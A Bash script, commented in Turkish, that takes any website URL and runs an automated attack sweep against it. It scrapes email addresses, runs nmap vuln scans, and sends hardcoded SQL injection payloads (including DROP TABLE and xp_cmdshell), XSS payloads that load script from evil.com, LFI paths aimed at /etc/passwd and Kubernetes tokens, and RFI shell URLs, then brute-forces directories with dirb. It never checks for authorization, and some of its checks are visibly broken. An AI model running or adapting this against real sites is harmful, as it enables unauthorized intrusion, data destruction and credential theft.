#!/bin/bash

# developer qawexsa1

# iyi günler iyi testler

# her sistemin açığı olduğu gibi insanların açığıda duygularıdır.

output_file="qawe.txt"
echo "Tarama sonuçları: " > $output_file

echo -e "\e[1m\e[32mDeveloper\e[0m \e[1m\e[36mqwexsa0\e[0m"
echo -e "\e[1;32mDiscord\e[0m \e[1m\e[36mqawexsa1\e[0m"


read -p "\e[1;33mLütfen taramak istediğiniz site linkini girin (örn: https://ornek.com): \e[0m" site


base_url=$(echo "$site" | sed 's|http[s]://||; s|www.||')

echo "Sitedeki e-posta adresleri aranıyor..." | tee -a $output_file
emails=$(curl -s "$site" | grep -oP "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
if [ -z "$emails" ]; then
    echo "Sitede e-posta adresi bulunamadı." | tee -a $output_file
else
    echo "Mailler:" | tee -a $output_file
    echo "$emails" | tee -a $output_file
fi

echo "Açık portlar ve servis versiyonları taranıyor..." | tee -a $output_file
nmap -sV -oN nmap_ports.txt "$base_url"
echo "Açık portlar ve servis versiyonları nmap_ports.txt dosyasına kaydedildi." | tee -a $output_file

echo "Anonim FTP giriş kontrolü yapılıyor..." | tee -a $output_file
nmap -p 21 --script=ftp-anon "$base_url" | tee nmap_ftp_anon.txt

echo "Vulnerability taraması (Nmap vuln scripti) başlatılıyor..." | tee -a $output_file
nmap --script vuln -oN nmap_vuln_scan.txt "$base_url"
echo "Vulnerability taraması sonuçları nmap_vuln_scan.txt dosyasına kaydedildi." | tee -a $output_file

echo "Site kaynak kodu inceleniyor..." | tee -a $output_file
curl -s "$site" > site_source.html

echo "Açıklar aranıyor..." | tee -a $output_file

if grep -q "password" site_source.html; then
    echo "Kaynak kodda şifre ile ilgili veriler bulundu!" | tee -a $output_file
fi

if grep -q "<script>" site_source.html; then
    echo "Kaynak kodda script etiketi bulundu. XSS açığına karşı dikkat edin!" | tee -a $output_file
fi

if grep -q "wp-admin" site_source.html; then
    echo "Site WordPress kullanıyor olabilir. WP-admin dizini bulundu!" | tee -a $output_file
fi

if grep -q "multipart/form-data" site_source.html; then
    echo "Dosya yükleme formu bulundu. Bu form güvenli mi kontrol edin!" | tee -a $output_file
fi

if curl -s "$site" | grep -q "Index of /"; then
    echo "Dizin listeleme açık! 'Index of' sayfası bulundu." | tee -a $output_file
fi

headers=$(curl -s -I "$site")
if ! echo "$headers" | grep -q "X-Frame-Options"; then
    echo "X-Frame-Options başlığı eksik. Clickjacking saldırılarına karşı savunmasız olabilir." | tee -a $output_file
fi

if ! echo "$headers" | grep -q "X-XSS-Protection"; then
    echo "X-XSS-Protection başlığı eksik. XSS saldırılarına karşı savunmasız olabilir." | tee -a $output_file
fi

if ! echo "$headers" | grep -q "Content-Security-Policy"; then
    echo "Content-Security-Policy başlığı eksik. Güvenlik politika başlığı eksik." | tee -a $output_file
fi

echo "SQL Injection açığı taranıyor..." | tee -a $output_file
sql_params=(
    "1" "' OR '1'='1" "'; DROP TABLE users; --" "' OR 'x'='x" "' OR 1=1 --" 
    "' UNION SELECT * FROM users --" "' OR 'a'='a" "' AND 1=1" "' AND 'x'='x" 
    "' OR 1=2" "'; EXEC xp_cmdshell('dir'); --" "' AND 1=2 --" "' OR 1=1#"
    "' AND 0=1 --" "' AND (SELECT COUNT(*) FROM users) > 0 --" 
    "'; SELECT username, password FROM users --" "' AND (SELECT VERSION())='5.7.31' --" 
    "'; SELECT @@version --" "' AND (SELECT * FROM users) IS NOT NULL --" 
    "' OR (SELECT 1) = (SELECT 1) --" "' OR (SELECT COUNT(*) FROM users) > 1 --"
    "' UNION SELECT username, password FROM users --" "' OR EXISTS(SELECT * FROM users) --"
    "' OR (SELECT LENGTH(password) FROM users) > 0 --" "' AND 1=1 --"
    "' OR '1'='2' UNION SELECT null, username FROM users --" 
    "'; WAITFOR DELAY '0:0:5' --" "' AND 1=2 UNION SELECT null, 'sql_injection' --"
)
for param in "${sql_params[@]}"; do
    response=$(curl -s "$site?id=$param")
    if echo "$response" | grep -qi "error in your SQL syntax"; then
        echo "Potansiyel SQL Injection zafiyeti tespit edildi: ?id=$param" | tee -a $output_file
    fi
done
echo "XSS Açığı taraması yapılıyor..." | tee -a $output_file
xss_params=(
    "alert('XSS')" "<script>alert('XSS')</script>" "<img src=x onerror=alert('XSS')>"
    "';alert(1)//" "<svg/onload=alert('XSS')>" "'><img src=x onerror=alert(1)>"
    "';--" "<script src='http://evil.com/xss.js'></script>" "<body onload=alert(1)>"
    "<iframe src='javascript:alert(1)'></iframe>" "<marquee onstart=alert(1)>"
    "<input onfocus=alert(1) autofocus>" "<a href='javascript:alert(1)'>click</a>"
    "';alert(1)" "<style>body{background:url('x');}</style>" "<video onerror=alert(1)>"
    "<details ontoggle=alert(1)>" "<textarea onfocus=alert(1)></textarea>"
    "<object data='javascript:alert(1)'></object>" "<embed src='javascript:alert(1)'>"
    "';alert(1);--" "<script>document.write('XSS');</script>" "<img src=x onerror='alert(1);'>"
    "<link rel='stylesheet' href='x' onerror='alert(1)'>"
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
    "<svg><script>alert(1)</script></svg>" "<iframe src='http://example.com' onload='alert(1)'></iframe>"
)
for param in "${xss_params[@]}"; do
    response=$(curl -s "$site?q=$param")
    if echo "$response" | grep -q "$param"; then
        echo "Potansiyel XSS zafiyeti tespit edildi: ?q=$param" | tee -a $output_file
    fi
done
echo "Upload yeri taranıyor..." | tee -a $output_file
if grep -q "multipart/form-data" site_source.html; then
    echo "Dosya yükleme formu bulundu!" | tee -a $output_file
else
    echo "Dosya yükleme formu bulunamadı." | tee -a $output_file
fi

echo "Local File Inclusion (LFI) açığı taranıyor..." | tee -a $output_file
lfi_params=(
    "../etc/passwd" "../var/log/apache2/access.log" "../var/log/syslog" 
    "../etc/hosts" "../etc/passwd.bak" "../proc/self/environ" 
    "../proc/version" "../proc/cpuinfo" "../proc/mounts" 
    "../var/mail/root" "../var/log/mysql/error.log" 
    "../var/log/nginx/access.log" "../var/log/nginx/error.log" 
    "../var/run/secrets/kubernetes.io/serviceaccount/token" 
    "../var/log/secure" "../var/lib/mysql/mysql/user.MYI"
)
for param in "${lfi_params[@]}"; do
    response=$(curl -s "$site?page=$param")
    if echo "$response" | grep -qi "root:"; then
        echo "Potansiyel LFI zafiyeti tespit edildi: ?page=$param" | tee -a $output_file
    fi
done

echo "Remote File Inclusion (RFI) açığı taranıyor..." | tee -a $output_file
rfi_params=(
    "http://evil.com/malicious.txt" "http://attacker.com/shell.php" 
    "http://example.com/malicious.php" "http://yourserver.com/shell.php" 
    "http://malicious.com/shell.txt"
)
for param in "${rfi_params[@]}"; do
    response=$(curl -s "$site?page=$param")
    if echo "$response" | grep -qi "success"; then
        echo "Potansiyel RFI zafiyeti tespit edildi: ?page=$param" | tee -a $output_file
    fi
done

echo "Insecure Direct Object References (IDOR) açığı taranıyor..." | tee -a $output_file
idor_params=(
    "user=1" "user=2" "user=3" "user=4" "user=5" "document=1" 
    "document=2" "item=1" "item=2" "id=1" "id=2" "product=1" 
    "product=2" "order=1" "order=2" "account=1" "account=2" 
    "profile=1" "profile=2" "post=1" "post=2" "comment=1" 
    "comment=2" "message=1" "message=2" "data=1" "data=2" 
)
for param in "${idor_params[@]}"; do
    response=$(curl -s "$site?user=$param")
    if echo "$response" | grep -q "user"; then
        echo "Potansiyel IDOR zafiyeti tespit edildi: ?user=$param" | tee -a $output_file
    fi
done

echo "Cross-Site Request Forgery (CSRF) açığı taranıyor..." | tee -a $output_file
csrf_params=(
    "csrf_token=invalid_token" "csrf=invalid_token" "token=invalid_token" 
    "csrf_token=123456" "csrf_token=' OR '1'='1'" "csrf_token=1' OR '1'='1" 
    "csrf_token=abc" "csrf=1 OR 1=1" "csrf_token=1' UNION SELECT 1,2" 
    "csrf=1' OR 1=1 --" "csrf=1' AND 1=1 --" "csrf=1' OR 1=2 --"
    "csrf_token=1 OR 'x'='x" "csrf_token=1' OR 1='1' --" "csrf_token=1' AND 0=1 --" 
    "csrf_token=1' OR 1='1' UNION SELECT null, username FROM users --" 
    "csrf_token=1' UNION SELECT username, password FROM users --" 
    "csrf_token=1' AND (SELECT COUNT(*) FROM users) > 0 --" 
    "csrf_token=1' AND (SELECT VERSION())='5.7.31' --" "csrf_token=1' AND (SELECT * FROM users) IS NOT NULL --" 
    "csrf_token=1' OR (SELECT COUNT(*) FROM users) > 1 --" "csrf_token=1' OR EXISTS(SELECT * FROM users) --"
)
for param in "${csrf_params[@]}"; do
    csrf_response=$(curl -s -X POST -d "$param" "$site/protected_action")  # Uygun bir URL ekleyin
    if echo "$csrf_response" | grep -q "success"; then
        echo "Potansiyel CSRF zafiyeti tespit edildi: $param" | tee -a $output_file
    fi
done
echo "Dirb taraması başlatılıyor..." | tee -a $output_file
dirb "$site" /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
echo "Dirb taraması tamamlandı. Sonuçlar dirb_output.txt dosyasına kaydedildi." | tee -a $output_file

echo "Tüm taramalar tamamlandı." | tee -a $output_file
                                                        
